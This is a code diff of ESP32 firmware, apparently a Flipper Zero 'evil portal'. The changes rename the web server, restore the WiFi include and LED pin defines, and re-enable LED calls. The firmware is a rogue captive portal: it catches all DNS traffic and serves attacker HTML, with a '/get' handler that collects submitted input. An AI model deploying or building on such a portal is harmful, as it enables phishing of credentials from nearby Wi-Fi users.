@@ -3,13 +3,13 @@
 #include "ESPAsyncWebServer.h"
 #include <AsyncTCP.h>
 #include <DNSServer.h>
-//#include <WiFi.h>
+#include <WiFi.h>
 
 #define MAX_HTML_SIZE 20000
 
-/*#define B_PIN 4
+#define B_PIN 4
 #define G_PIN 5
-#define R_PIN 6*/
+#define R_PIN 6
 
 #define WAITING 0
 #define GOOD 1
@@ -23,7 +23,7 @@
 
 // GLOBALS
 DNSServer dnsServer;
-AsyncWebServer server(80);
+AsyncWebServer evilportal_server(80);
 
 bool runServer = false;
 
@@ -38,8 +38,6 @@ char index_html[MAX_HTML_SIZE] = "TEST";
 // RESET
 void (*resetFunction)(void) = 0;
 
-
-
 // AP FUNCTIONS
 class CaptiveRequestHandler : public AsyncWebHandler {
 public:
@@ -53,8 +51,8 @@ public:
   }
 };
 
-/*void setLed(int i) {
-  if (i == WAITING) {
+void setLed(int i) {
+  /*if (i == WAITING) {
     digitalWrite(B_PIN, LOW);
     digitalWrite(G_PIN, HIGH);
     digitalWrite(R_PIN, HIGH);
@@ -66,16 +64,16 @@ public:
     digitalWrite(B_PIN, HIGH);
     digitalWrite(G_PIN, HIGH);
     digitalWrite(R_PIN, LOW);
-  }
-}*/
+  }*/
+}
 
 void setupServer() {  
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+  evilportal_server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
     request->send_P(200, "text/html", index_html);
     Serial.println("client connected");
   });
 
-  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
+  evilportal_server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
     String inputMessage;
     String inputParam;
 
@@ -112,8 +110,8 @@ void startAP() {
   setupServer();
 
   dnsServer.start(53, "*", WiFi.softAPIP());
-  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
-  server.begin();
+  evilportal_server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+  evilportal_server.begin();
 }
 
 bool checkForCommand(char *command) {
@@ -172,14 +170,14 @@ void evilportal_setup() {
   pinMode(G_PIN, OUTPUT);
   pinMode(R_PIN, OUTPUT);*/
 
-  //setLed(WAITING);
+  setLed(WAITING);
 
   //Serial.begin(115200);
 
   // wait for init flipper input
   getInitInput();
 
-  //setLed(GOOD);
+  setLed(GOOD);
 
   startPortal();
 }
